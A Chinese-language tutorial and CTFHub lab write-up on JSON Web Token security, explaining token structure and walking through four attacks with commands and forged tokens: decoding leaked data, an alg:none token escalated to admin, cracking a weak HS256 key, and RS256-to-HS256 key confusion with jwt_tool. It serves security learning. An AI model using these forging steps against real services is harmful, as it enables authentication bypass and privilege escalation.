# 0X00 前言
之前听同学说过JWT方面的安全问题，后来在某次渗透过程中遇到了JWT，于是来复习一波。
# 0X01 什么是JWT
JSON Web Token (JWT)，是在网络应用环境各方之间传递信息的一种基于JSON的开放标准。该token被设计为紧凑且安全的，特别适用于分布式站点的单点登录（SSO）场景。

简单来说，JWT就是能传递你身份的一个token值，用于在各方之间安全地传递信息。
# 0x02 JWT 工作流程
假设有一个用户想从资源服务器检索一些信息。

1. 客户端必须通过提供登录凭据向服务器进行身份验证，然后授权服务器与存储凭据的数据库进行对话。
1. 验证凭证后，生成 JWT 令牌，授权服务器使用 JWT 令牌回复客户端。
1. 客户端将此令牌提供给资源服务器以从资源服务器访问他想要的资源。当资源服务器获取到这个 JWT 令牌时，它会尝试验证 JWT 令牌是否有效。资源服务器的主要工作是验证令牌的完整性。当验证完成后，客户端将获得他所请求的资源。

![image.png](https://cdn.nlark.com/yuque/0/2022/png/22669825/1645609499776-4bd86a49-95ea-4ad8-bf94-c9ec763f32d0.png#clientId=u900b2298-9cff-4&from=paste&height=382&id=u24dd02fd&margin=%5Bobject%20Object%5D&name=image.png&originHeight=764&originWidth=975&originalType=binary&ratio=1&size=214610&status=done&style=none&taskId=u2fcb8e63-2c76-4663-af2e-680ed7b3920&width=487.5)
​

# 0X03 JWT的结构
JWT 分为三部分，头部（Header），有效载荷（payload），签名（Signature），这三部分中间用点 `.` 分割。
```shell
Header.Payload.Signature

# 举例
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
```
JWT 的内容以 Base64URL 进行了编码。其中Header和Claims这两个相当于直接编码，所以如果你想看它里面的内容，直接解码就可以，不过最后一部分（签名Signature）它是通过一个秘钥并且结合前两部分的内容来生成的。

- [Base64URL编码网站](https://base64.guru/standards/base64url)

注意：虽然它是通过base64编码了，但是你会发现它没有‘+’或‘=’这种符号，因为在 HTTP 传输过程中，Base64 编码中的"=","+","/"等特殊符号通过 URL 解码通常容易产生歧义，因此jwt中的Base64是需要去掉特殊符号的，使用Base64URL可以直接得到去除了特殊字符的Base64编码。
## 头部（Header）：
```shell
{
"alg":"HS256",
"typ":"JWT"
}

# 通过头部信息，资源服务器在验证签名时知道使用的是什么类型的算法。
# alg：说明这个JWT的签名使用的算法是什么，常见：HS256（默认），HS512，None等。HS256表示HMAC SHA256。
# typ：说明这个token的类型为JWT
```
## 有效载荷（Payload）：
这部分通常包含用于授权的用户标识信息。
```shell
{
"exp": 1326451934,
"user_name": "tom",
"scope": [
"read",
"write"
],

"jti": "5kc56a43-0a2a-3b6e-eb70-bf76073b9a84",
"client_id": "my-client-with-secret",
"isAdmin":"false"
}


# 常见的键如下，不是所有键都必须有
# iss：发行人
# exp：到期时间
# sub：主题
# aud：用户
# iat：发布时间
# jti：JWT ID用于标识该JWT

这些是键值对格式。一旦签名部分和有效负载部分被验证为有效，该用户tom将有权访问他请求的资源。
在isAdmin可看到，用户 tom 不是管理员用户。因此，JWT 中的安全问题可能出现在这里，我们可以对有效payload进行更改以欺骗服务器以任何其他用户身份登录或进行垂直越权。
```
## 签名（Signature）：
服务器有一个不会发送给客户端的密码（secret），用头部中指定的算法对Header和Payload的内容用此密码进行加密，生成的字符串就是JWT的签名。


**HS256和RS256是常用的算法**
**​**

### HS256 算法
HS256 算法采用`Header（base64url 编码后的）`后跟一个点`.`和`Payload（base64url 编码后的）`。它附加一个只有授权服务器和资源服务器知道的`secret`，然后进行SHA256 哈希。之后再进行一次base64url 编码。这就是我们获得 `HS256 Signature`签名的方式。
最后，它将附加到 Header 和 payload后面，构成`Header.Payload.Signature`
![image.png](https://cdn.nlark.com/yuque/0/2022/png/22669825/1645536690945-494aade3-23b5-4c81-b340-19acb68cc7b0.png#clientId=ufee476a5-7506-4&from=paste&id=u7012b451&margin=%5Bobject%20Object%5D&name=image.png&originHeight=233&originWidth=735&originalType=binary&ratio=1&size=111625&status=done&style=none&taskId=ub5594647-0d37-4e23-a5c9-6e031173306)

HS256 的潜在安全问题： 

1. 密钥被分发到所有服务器，如果一台服务器被入侵，共享密钥可能被盗。 
1. 如果共享密钥很弱，那么我们可以执行暴力破解密钥。

​

### RS256 算法
RS256 使用 RSA 和 SHA256 算法。 

1. 生成 `Header` 和 `Payload` 的 SHA256 哈希。 
1. 此哈希使用 RSA 私钥签名。 
1. 因此，`RS256 Signature`是 经过`Header`、`Payload` SHA256 哈希的`Signature` 。 
1. 再进行一次base64url 编码。
1. 这作为 JWT 令牌的第三部分`Signature`。

![image.png](https://cdn.nlark.com/yuque/0/2022/png/22669825/1645536764981-d3cf55e4-f984-4c8e-998f-9b468de9f43c.png#clientId=ufee476a5-7506-4&from=paste&id=ufc46a67f&margin=%5Bobject%20Object%5D&name=image.png&originHeight=240&originWidth=736&originalType=binary&ratio=1&size=171134&status=done&style=none&taskId=u25e545fc-504a-4526-a744-70f9b143625)

一旦授权服务器产生这个 JWT 令牌，这个令牌就会返回给客户端。当客户端将此 JWT 呈现给资源服务器时，资源服务器需要 RSA 公钥来验证签名。资源服务器确保 JWT 中存在的签名实际上是使用授权服务器的私钥创建的。 
现在，假设攻击者想要使用 RS256 生成这个 JWToken。在这种情况下，他需要获取仅在授权服务器上的私钥，即使是资源服务器也无法创建 JWToken。资源服务器只能验证授权服务器创建的令牌是否有效。 
因此，只有当hacker拥有用于加密哈希的私钥时，hacker才能复制此令牌。
# 0X04 JWT攻击点及检测
```shell
检测：
1）javaweb应用 
2）Authorization 
3）数据包存在JWT格式传输

攻击点：
1）敏感信息：直接解密JWT获得敏感信息
2）数据伪造：无密钥，攻击者通过修改Payload达到绕过 
3）数据伪造：有密钥 -> 破解弱密钥 -> 修改相应数据后重新加密传输
4）修改签名：修改签名算法 -> 修改相应数据后重新加密传输
```
## 4.1 敏感信息泄露
访问题目地址->输入admin/admin登录->产生token，再次刷新网址，抓包发现JWT格式token
![image.png](https://cdn.nlark.com/yuque/0/2022/png/22669825/1645596047802-f7e9b324-0501-4b8d-b08c-5af1f2dc9126.png#clientId=u43c3d3c0-d629-4&from=paste&height=378&id=u514fcd88&margin=%5Bobject%20Object%5D&name=image.png&originHeight=504&originWidth=938&originalType=binary&ratio=1&size=91567&status=done&style=none&taskId=u43e46be4-a14e-42cd-9546-0c18fd959dc&width=704)


去[jwt解密网站](https://jwt.io/)解密，存在敏感信息泄露，获得flag
![image.png](https://cdn.nlark.com/yuque/0/2022/png/22669825/1645596124594-4537311d-2606-45c0-a733-c018a22b0c62.png#clientId=u43c3d3c0-d629-4&from=paste&height=268&id=u13a65544&margin=%5Bobject%20Object%5D&name=image.png&originHeight=536&originWidth=1173&originalType=binary&ratio=1&size=77886&status=done&style=none&taskId=u02ee358a-263a-432c-9af8-7772d4c247e&width=586.5)
​

## 4.2 无签名验证漏洞（none）
> 一些JWT库也支持none算法，即不使用签名算法。当alg字段为空时，后端将不执行签名验证。

### 4.2.1 抓取token
访问题目地址->输入admin/admin登录->产生token，再次刷新网址，抓包发现JWT格式token
![image.png](https://cdn.nlark.com/yuque/0/2022/png/22669825/1645596560015-08dbafed-1764-48a7-8644-e4b9d4954bf7.png#clientId=u43c3d3c0-d629-4&from=paste&height=211&id=u719ee9f2&margin=%5Bobject%20Object%5D&name=image.png&originHeight=422&originWidth=1413&originalType=binary&ratio=1&size=109794&status=done&style=none&taskId=ub2c70f1d-3aa0-41d1-b7f5-fbfc393871c&width=706.5)


### 4.2.2 去[jwt解密网站](https://jwt.io/)解密
![image.png](https://cdn.nlark.com/yuque/0/2022/png/22669825/1645596604455-d93e1d1a-817d-4684-a3a3-b645c1b79a06.png#clientId=u43c3d3c0-d629-4&from=paste&height=339&id=ubef2b13b&margin=%5Bobject%20Object%5D&name=image.png&originHeight=678&originWidth=1144&originalType=binary&ratio=1&size=79858&status=done&style=none&taskId=ud270adbe-0947-45d6-a7b8-bbb9e98d6c0&width=572)
​

### 4.2.3 修改JWT

- [base64url编码工具](https://base64.guru/standards/base64url/encode)
#### 1）修改Header，使用none算法
```shell
{
"typ":"JWT",
"alg":"none"
}

ew0KInR5cCI6IkpXVCIsDQoiYWxnIjoibm9uZSINCn0
```
![image.png](https://cdn.nlark.com/yuque/0/2022/png/22669825/1645596708178-f46ff13a-10be-4b63-a988-e0c4d00cbb28.png#clientId=u43c3d3c0-d629-4&from=paste&height=220&id=u16d39944&margin=%5Bobject%20Object%5D&name=image.png&originHeight=440&originWidth=538&originalType=binary&ratio=1&size=19780&status=done&style=none&taskId=u7680ae15-129f-44c6-bf27-0cab30375e9&width=269)


#### 2）修改payload信息，将guest改为admin
```shell
{
  "username": "admin",
  "password": "admin",
  "role": "admin"
}

ew0KICAidXNlcm5hbWUiOiAiYWRtaW4iLA0KICAicGFzc3dvcmQiOiAiYWRtaW4iLA0KICAicm9sZSI6ICJhZG1pbiINCn0
```
![image.png](https://cdn.nlark.com/yuque/0/2022/png/22669825/1645596852534-f3690bf7-3035-4e9d-9219-efacc95a0380.png#clientId=u43c3d3c0-d629-4&from=paste&height=214&id=u848a598b&margin=%5Bobject%20Object%5D&name=image.png&originHeight=428&originWidth=899&originalType=binary&ratio=1&size=26184&status=done&style=none&taskId=u2e6cd205-cdde-4748-b6a9-38cb1d4660c&width=449.5)


#### 3）构造新的JWT
由于使用无签名算法，所以Signature为空。然后使用`.`将Header、Payload和Signature拼接起来，得到新的JWT。
虽然Signature为空，它前面的`.`不能忘！
```shell
ew0KInR5cCI6IkpXVCIsDQoiYWxnIjoibm9uZSINCn0.ew0KICAidXNlcm5hbWUiOiAiYWRtaW4iLA0KICAicGFzc3dvcmQiOiAiYWRtaW4iLA0KICAicm9sZSI6ICJhZG1pbiINCn0.
```
#### 4）使用 [jwt_tool](https://github.com/ticarpi/jwt_tool) 一步到位获得新的JWT
```shell
git clone https://github.com/ticarpi/jwt_tool.git
python3 jwt_tool.py <your token> -X a
```
### 4.2.4 替换token，发包获取flag
![image.png](https://cdn.nlark.com/yuque/0/2022/png/22669825/1645596954608-6be8f61d-68ab-4165-9ee6-2026b17f848a.png#clientId=u43c3d3c0-d629-4&from=paste&height=322&id=u5caa59f4&margin=%5Bobject%20Object%5D&name=image.png&originHeight=429&originWidth=1405&originalType=binary&ratio=1&size=113913&status=done&style=none&taskId=ud8b15f05-926a-4407-98f0-dcc08f8986a&width=1054)


## 4.3 弱密钥
> 如果JWT采用对称加密算法，并且密钥的强度较弱的话，攻击者可以直接通过蛮力攻击方式来破解密钥。

### 4.3.1 抓取token、解密
访问题目地址->输入admin/admin登录->产生token，再次刷新网址，抓包发现JWT格式token
![image.png](https://cdn.nlark.com/yuque/0/2022/png/22669825/1645597724643-40f438a9-2f60-461e-ad71-8286b1f60186.png#clientId=u43c3d3c0-d629-4&from=paste&height=303&id=u67bb7eb3&margin=%5Bobject%20Object%5D&name=image.png&originHeight=404&originWidth=1413&originalType=binary&ratio=1&size=107637&status=done&style=none&taskId=ub3c2e383-2e67-4899-9d9c-372669b0674&width=1060)
```shell
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicGFzc3dvcmQiOiJhZG1pbiIsInJvbGUiOiJndWVzdCJ9.gpGZ3RoBgMB3eYgewo2gwqso8cpJpFs7sTqagmiTawo
```
​

把token放到 [jwt解密网站](https://jwt.io/) 解密
![image.png](https://cdn.nlark.com/yuque/0/2022/png/22669825/1645597982846-513ac4d1-a557-4489-9a89-233357e0d4bf.png#clientId=u43c3d3c0-d629-4&from=paste&height=334&id=u63a471f6&margin=%5Bobject%20Object%5D&name=image.png&originHeight=667&originWidth=1070&originalType=binary&ratio=1&size=81340&status=done&style=none&taskId=u191af694-70ec-412d-9bce-fc6f3a42a81&width=535)


### 4.3.2 爆破密钥
使用[JWT cracker](https://github.com/brendan-rius/c-jwt-cracker)工具爆破密钥，爆破得到密钥是`toos`
```shell
git clone https://github.com/brendan-rius/c-jwt-cracker.git

# 生成 jwtcrack
make

# 破解弱密钥
./jwtcrack eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicGFzc3dvcmQiOiJhZG1pbiIsInJvbGUiOiJndWVzdCJ9.gpGZ3RoBgMB3eYgewo2gwqso8cpJpFs7sTqagmiTawo
```
![image.png](https://cdn.nlark.com/yuque/0/2022/png/22669825/1645597595184-3b559ab6-be73-4b4b-b968-e08c44bbb045.png#clientId=u43c3d3c0-d629-4&from=paste&id=u9e8c6f42&margin=%5Bobject%20Object%5D&name=image.png&originHeight=59&originWidth=1600&originalType=binary&ratio=1&size=24862&status=done&style=none&taskId=u7fc4f731-02b6-491e-a15a-862915c86fb)


### 4.3.3 生成新的JWT
在[jwt解密网站](https://jwt.io/)输入**密钥**，修改`head`和`payload`
![image.png](https://cdn.nlark.com/yuque/0/2022/png/22669825/1645598073898-3a72d1d7-00e1-4b88-ad7d-aa2df525f979.png#clientId=u43c3d3c0-d629-4&from=paste&height=332&id=u9b3accbc&margin=%5Bobject%20Object%5D&name=image.png&originHeight=663&originWidth=1066&originalType=binary&ratio=1&size=84007&status=done&style=none&taskId=ue8295426-909f-4c27-ac2f-52cff49362c&width=533)
​

生成新的JWT
```shell
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicGFzc3dvcmQiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9.As2u3UYQEvC1qDMEcOP66Yw6qB4ay2l1uF5WmjAPttk
```
### 4.3.4 替换token，获得flag
![image.png](https://cdn.nlark.com/yuque/0/2022/png/22669825/1645598140357-b7dd228f-c9fd-44b2-b6dd-650f6878b461.png#clientId=u43c3d3c0-d629-4&from=paste&height=318&id=u472f661c&margin=%5Bobject%20Object%5D&name=image.png&originHeight=424&originWidth=1414&originalType=binary&ratio=1&size=115197&status=done&style=none&taskId=u7510c9de-447a-495b-9ac6-69385786aa7&width=1061)


## 4.4 修改签名算法
> 有些JWT库支持多种密码算法进行签名、验签。若目标使用非对称密码算法时，有时攻击者可以获取到公钥，此时可通过修改JWT头部的签名算法，将非对称密码算法改为对称密码算法，从而达到攻击者目的。

RS256 算法需要一个私钥来篡改数据，还需要一个相应的公钥来验证签名的真实性。但是，如果我们 
能够将签名算法从 RS256 更改为 HS256，我们就会混淆服务器使用HS256算法而不是RS256算法。我们将强制应用程序只使用一个密钥来完成这两项任务，这是**HMAC**算法的正常行为。
​

**HMAC**算法是一种基于密钥的报文完整性的验证方法,其安全性是建立在Hash加密算法基础上的。
### 4.4.1 抓取token、解密
访问题目地址->输入admin/admin登录->产生token，再次刷新网址，抓包发现JWT格式token
![image.png](https://cdn.nlark.com/yuque/0/2022/png/22669825/1645599259143-a58bb077-729a-477f-be2d-72340870cd02.png#clientId=u43c3d3c0-d629-4&from=paste&height=557&id=u9f429cf3&margin=%5Bobject%20Object%5D&name=image.png&originHeight=743&originWidth=1503&originalType=binary&ratio=1&size=193351&status=done&style=none&taskId=u007eb992-b443-40ff-8adc-68d5d5821e6&width=1127)


解密发现这是RS256算法，需要公钥和私钥，私钥咱们一般人哪拿得到啊！
`**RS256 token**`：
```shell
eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6Imd1ZXN0In0.S-z1LsTmUl6kSQ8h8AtUM6T6-rk5AgTKapCh1YPxxW8Cc0FYsR3E7O4dzLFlXmatlAv_LxGESi0Cx_-OQknjUyz2klBYmq3kUyjJ1pApYQWlMAIg2XX9O5B7nnk_o1-VkPbt9rZnyqRXK3KsTEXIhK-B8tscGsA4NYMF98ZIv5sci_MciDQLLJeKxP0h8cGV3pyx0aKuYOOORKG-2f0ebkoUuVZNEonKnUc4yziUQxLWYjYHAN4t_nJBbkXTVyDjl6U-EeWjRsfXVFUynGiZCUtbtsxMxm3VBrh-VGXhThatC8Kyf2yOB3NtDUeisw0HxC3n94jI7LyBC1E59-Oqwg
```
![image.png](https://cdn.nlark.com/yuque/0/2022/png/22669825/1645599175166-5bef3cd9-93e5-495c-9a0b-420588b75b16.png#clientId=u43c3d3c0-d629-4&from=paste&height=554&id=IHQ2g&margin=%5Bobject%20Object%5D&name=image.png&originHeight=738&originWidth=1124&originalType=binary&ratio=1&size=119734&status=done&style=none&taskId=uabf59211-bd88-4ca3-b1d2-4e20fb77798&width=843)


### 4.4.2 `publickey.pem`
所以在这里我们要将算法从 `RS256` 更改为 `HS256`。
通过这种方式，工作流将从非对称加密转换为对称加密，并且我们可以使用相同的公钥签署新令牌。 
#### 1）获取 `publickey.pem`
由于这是一个公钥，所以这个密钥必须保持公开。所以你可以在互联网上找到它，或者另一个潜在的来源是服务器的 TLS 证书，它可能被重新用于 JWT 操作：
```shell
命令： 
openssl s_client -connect <主机名>:443 

将“服务器证书”输出复制到文件（例如cert.pem）并通过运行提取公钥（到名为key.pem的文件）： 
openssl x509 -in cert.pem -pubkey -noout > key.pem 

这样就可以获得任何主机的 public.pem
```


获取`publickey.pem`
此题中，访问`[http://challenge-bac2035c7422a30b.sandbox.ctfhub.com:10800/publickey.pem](http://challenge-bac2035c7422a30b.sandbox.ctfhub.com:10800/publickey.pem)`即可获得`publickey.pem`
```shell
-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAy1kgh65ETe9UHnHtlIB0
WkaxrwlgepVRUPi9zwx1RNosueb43idz+M9fVt7wcqetrxfrxbmNTjKCzD60xi/O
6MX1SQR75gK/eY8V+QtCQHkjo8ENLJhiCLoVet9TrGGxK82EHgtzFZJOvprPwvi1
3s1LNuCToJzS8nDQcp72WsSPamLFQgxiLGBhisw2zEZsiviVJZHNuLCOXHbGbCGH
sEMcUVYt//wCG0/MsscLLeWSr7qMQ+G9K6YbGIjrqoBg/a6EMY0Z8W3Olei+zQL5
CsTXiLBE8fjoCzHDlBqaNg/fZ9WRB+FTyc9z15CHwRCsmnweRDYO5vctCjQTIME0
oQIDAQAB
-----END PUBLIC KEY-----
```
#### 2）验证 `publickey.pem`
找到公钥后，保存为public.pem。验证是否有效：
```shell
python3 jwt_tool.py -V -pk public.pem <JWT RS256 TOKEN>
```
![image.png](https://cdn.nlark.com/yuque/0/2022/png/22669825/1645606983997-16669286-2c4f-41cc-8638-d8c3beae3797.png#clientId=u43c3d3c0-d629-4&from=paste&height=225&id=u6dc0f34c&margin=%5Bobject%20Object%5D&name=image.png&originHeight=300&originWidth=1636&originalType=binary&ratio=1&size=84344&status=done&style=none&taskId=u6a11ad38-eb7e-401e-a026-04cfe7f4d2f&width=1227)
​

### 4.4.3 更改算法
#### 1）更改算法 -> 验证能否通过服务器验证
使用名为 [jwt_tool](https://github.com/ticarpi/jwt_tool) 的相同工具更改算法
```shell
python3 jwt_tool.py <JWT RS256 TOKEN> -S hs256 -k public.pem
```
![image.png](https://cdn.nlark.com/yuque/0/2022/png/22669825/1645599581709-de7978ba-5d59-4df5-b278-197d6a57cee1.png#clientId=u43c3d3c0-d629-4&from=paste&height=128&id=u584af2fc&margin=%5Bobject%20Object%5D&name=image.png&originHeight=170&originWidth=533&originalType=binary&ratio=1&size=52794&status=done&style=none&taskId=u535cc71c-9545-4d04-85d5-ba373f00577&width=400)
![image.png](https://cdn.nlark.com/yuque/0/2022/png/22669825/1645599705449-95a44e5a-bf65-488b-87e0-2a0070d9165d.png#clientId=u43c3d3c0-d629-4&from=paste&id=u1a4a9a61&margin=%5Bobject%20Object%5D&name=image.png&originHeight=623&originWidth=1645&originalType=binary&ratio=1&size=156843&status=done&style=none&taskId=u5c0952d4-66fe-4513-9f18-4a941c49428)
​

我们得到了 HS256 签名JWT： 
```shell
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6Imd1ZXN0In0.fBz36kL451jws0a_EHi-J86OIsoNqq_asLAWGZNsKRA
```
​

拿去解密，已经成功更改为HS256算法。
![image.png](https://cdn.nlark.com/yuque/0/2022/png/22669825/1645599912901-1f73ffc1-8bf1-4b15-a750-f1b6e7e6232e.png#clientId=u43c3d3c0-d629-4&from=paste&height=433&id=u3d428491&margin=%5Bobject%20Object%5D&name=image.png&originHeight=578&originWidth=1119&originalType=binary&ratio=1&size=60848&status=done&style=none&taskId=u3dfe31ac-55ad-40ea-bfa3-1ecb2c1722f&width=839)
​

修改token，可以通过验证，但依旧不是admin权限，看不到FLAG：
![image.png](https://cdn.nlark.com/yuque/0/2022/png/22669825/1645600169648-22d76a92-51a4-4247-b435-764f59267189.png#clientId=u43c3d3c0-d629-4&from=paste&height=552&id=ubc0de141&margin=%5Bobject%20Object%5D&name=image.png&originHeight=736&originWidth=1862&originalType=binary&ratio=1&size=183807&status=done&style=none&taskId=u6b15f265-76de-408c-b582-cf2b46f9553&width=1397)


#### 2）修改payload值
还是用[jwt_tool](https://github.com/ticarpi/jwt_tool)
```shell
python3 jwt_tool.py <JWT RS256 TOKEN> -S hs256 -k public.pem -T

# 本题中如下
python3 jwt_tool.py eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6Imd1ZXN0In0.S-z1LsTmUl6kSQ8h8AtUM6T6-rk5AgTKapCh1YPxxW8Cc0FYsR3E7O4dzLFlXmatlAv_LxGESi0Cx_-OQknjUyz2klBYmq3kUyjJ1pApYQWlMAIg2XX9O5B7nnk_o1-VkPbt9rZnyqRXK3KsTEXIhK-B8tscGsA4NYMF98ZIv5sci_MciDQLLJeKxP0h8cGV3pyx0aKuYOOORKG-2f0ebkoUuVZNEonKnUc4yziUQxLWYjYHAN4t_nJBbkXTVyDjl6U-EeWjRsfXVFUynGiZCUtbtsxMxm3VBrh-VGXhThatC8Kyf2yOB3NtDUeisw0HxC3n94jI7LyBC1E59-Oqwg -S hs256 -k public.pem -T
```
![image.png](https://cdn.nlark.com/yuque/0/2022/png/22669825/1645605816249-1ea0cf3e-4b07-4858-ac34-35b5547c3b56.png#clientId=u43c3d3c0-d629-4&from=paste&height=528&id=ub28dabfc&margin=%5Bobject%20Object%5D&name=image.png&originHeight=704&originWidth=1651&originalType=binary&ratio=1&size=161627&status=done&style=none&taskId=uc6cdba80-e327-4899-a413-a95c6b2c714&width=1238)
![image.png](https://cdn.nlark.com/yuque/0/2022/png/22669825/1645605942921-469b92e6-810f-403f-9a81-c6acf96207bd.png#clientId=u43c3d3c0-d629-4&from=paste&height=321&id=u1074692d&margin=%5Bobject%20Object%5D&name=image.png&originHeight=428&originWidth=1079&originalType=binary&ratio=1&size=86194&status=done&style=none&taskId=ufca0c3a4-ddf4-45e4-9db5-f10d3b5fac1&width=809)
### 4.4.4 替换token，发包获得flag
![image.png](https://cdn.nlark.com/yuque/0/2022/png/22669825/1645600528690-94d0a35c-3772-4957-9dd0-1fc093be0d1f.png#clientId=u43c3d3c0-d629-4&from=paste&height=400&id=u98ad5cd3&margin=%5Bobject%20Object%5D&name=image.png&originHeight=800&originWidth=1860&originalType=binary&ratio=1&size=194812&status=done&style=none&taskId=u2a9f9e1d-99a4-4fc9-a2e4-70945d3c081&width=930)


# 0x05 参考链接

- [https://anubhav-singh.medium.com/get-a-feel-of-jwt-json-web-token-8ee9c16ce5ce](https://anubhav-singh.medium.com/get-a-feel-of-jwt-json-web-token-8ee9c16ce5ce)
- [https://mp.weixin.qq.com/s/avOTFTqRVrP1RHwn-c2sXA](https://mp.weixin.qq.com/s/avOTFTqRVrP1RHwn-c2sXA)
- [JWT 鉴权攻击 @zjun](https://blog.zjun.info/tech/attacking-jwt-authentication/)
- [Attacks on JSON Web Token (JWT) -- Anubhav Singh](https://infosecwriteups.com/attacks-on-json-web-token-jwt-278a49a1ad2e)
- [JWT实战-2020-虎符网络安全赛道-Web-easy_login](https://mp.weixin.qq.com/s/avOTFTqRVrP1RHwn-c2sXA)
- [本文靶场 - ctfhub](https://www.ctfhub.com/#/skilltree)​
- [base64url编码工具](https://base64.guru/standards/base64url/encode)
- [https://github.com/ticarpi/jwt_tool](https://github.com/ticarpi/jwt_tool)
- [jwt解密网站](https://jwt.io/)
- [穷举密钥的脚本jwt-cracker](https://github.com/lmammino/jwt-cracker)

























